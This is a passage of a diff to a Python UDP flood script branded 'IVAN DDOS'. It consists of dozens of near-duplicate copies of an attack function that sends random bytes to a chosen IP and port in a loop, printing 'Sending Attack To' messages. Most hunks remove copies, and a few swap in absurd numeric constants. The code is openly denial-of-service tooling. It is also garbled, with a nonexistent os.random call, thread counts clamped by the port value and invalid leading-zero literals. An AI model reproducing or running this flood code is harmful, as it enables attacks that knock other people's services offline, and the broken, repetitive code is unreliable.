-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
-    
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
- 
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
-    
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-    
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-    
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -12311,225 +11871,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-    
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-    
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -12905,7 +12247,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -12937,7 +12279,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -12969,7 +12311,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -13001,7 +12343,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -13033,7 +12375,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -13059,7 +12401,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -13091,39 +12433,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -13155,7 +12465,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -13187,415 +12497,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
-    
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
-   
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
- 
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
-    
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
-    
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
-   
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
- 
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
-    
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
- 
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
-    
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-    
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-    
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -13627,225 +12529,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-    
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-    
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
